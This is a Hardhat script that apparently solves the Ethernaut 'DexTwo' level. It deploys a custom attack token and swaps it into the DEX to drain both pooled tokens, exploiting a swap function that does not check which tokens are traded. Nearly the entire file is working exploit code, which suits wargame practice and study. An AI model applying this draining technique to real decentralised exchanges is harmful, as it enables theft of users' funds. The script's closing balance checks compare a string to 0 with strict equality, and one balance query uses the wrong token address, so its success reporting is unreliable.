import { ethers } from "hardhat";

const attackDexTwo = async () => {
    // change contract addresses here.
    const dexTwoAddress = process.env.DEXTWO!; //type "await contract.address()" in ethernaut console
    const player = process.env.PLAYER; //place your player address here (you may type player in ethernaut console)
    const args: any[] = [];
    const deployer = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below
    // The vulnerability here arises from swap method which does not
    // check that the swap is necessarily between token1 and token2.
    // You may read more on:
    // https://eips.ethereum.org/EIPS/eip-20
    // We're going to swap our own token for token1 and token2
    // sample table below
    //       DEX             |      player
    // token1 - token2 - ATK | token1 - token2 - ATK
    // ---------------------------------------------
    //   100     100     100 |   10      10      300

    // deploying attack contract here
    // const deployed = await deployContract(hre, "AttackToken", args);
    // alternative below
    console.log("Deploying attack contract AttackToken...");
    const attack = await (await ethers.getContractFactory("AttackToken", deployer)).deploy();
    console.log(attack);
    console.log(`Attack contract deployed to ${attack.address}`);
    // experimantal verify below
    // if (attackToken.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: attackToken.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    console.log("Approving ATK tokens for transfer...");
    const approveATK = await attack.approve(dexTwoAddress, 200);
    const approveATKtxn = await approveATK.wait();
    console.log(approveATKtxn);
    console.log("ATK token approved...Transfering next...");
    const send1 = await attack.transfer(dexTwoAddress, 100);
    const send1txn = await send1.wait();
    console.log(send1txn);
    console.log("ATK token sent to dexTwo...");

    const ABI = [
        "function approve(address spender, uint amount)",
        "function swap(address from, address to, uint amount)",
        "function balanceOf(address token, address account) public view returns (uint)",
        {
            inputs: [],
            name: "token1",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "token2",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            stateMutability: "view",
            type: "function",
        },
    ];
    const contract = await ethers.getContractAt(ABI, dexTwoAddress);
    const token1Address = await contract.token1();
    const token2Address = await contract.token2();
    console.log(`Token 1 address is: ${token1Address}`);
    console.log(`Token 2 address is: ${token2Address}`);
    console.log("Checking token 1 and 2 balances...");
    let token1Balance = await contract.balanceOf(token1Address, player);
    let token2Balance = await contract.balanceOf(token2Address, player);
    let token3Balance = await contract.balanceOf(token2Address, player);
    console.log(`Token 1 balance is: ${token1Balance}`);
    console.log(`Token 2 balance is: ${token2Balance}`);
    console.log(`Token 3 balance is: ${token3Balance}`);
    const approve = await attack.approve(dexTwoAddress, 300);
    const approveReceipt = await approve.wait();
    console.log(approveReceipt);
    console.log("Approved token transfers");
    console.log("Draining token1...");
    const swap1 = await contract.swap(attack.address, token1Address, 100);
    const swap1txn = await swap1.wait();
    console.log(swap1txn);
    // sample table below of balances from here
    //       DEX             |      player
    // token1 - token2 - EVL | token1 - token2 - EVL
    // ---------------------------------------------
    //   100     100     100 |   10      10      300
    // //   0       100     200 |   110     10      200
    console.log("Draining token2...");
    const swap2 = await contract.swap(attack.address, token2Address, 200);
    const swap2txn = await swap2.wait();
    console.log(swap2txn);
    // final sample table below
    //       DEX             |      player
    // token1 - token2 - EVL | token1 - token2 - EVL
    // ---------------------------------------------
    //   100     100     100 |   10      10      300
    //   0       100     200 |   110     10      200
    //   0       0       400 |   110     110     0
    console.log("Checking balances of token1 and token2...");
    token1Balance = await contract
        .balanceOf(token1Address, dexTwoAddress)
        .then((v: any) => v.toString());
    if (token1Balance === 0) {
        console.log("Token1 balance is 0, continuing");
    } else {
        console.log("Token1 balance is not 0, continuing");
    }

    token2Balance = (await contract.balanceOf(token2Address, dexTwoAddress)).toString();
    if (token2Balance === 0) {
        console.log("Token2 balance is 0, level passed and you can submit to ethernaut");
    } else {
        console.log("Token2 balance is not 0, review code above");
    }
    console.log(token1Balance);
    console.log(token2Balance);
};

attackDexTwo()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
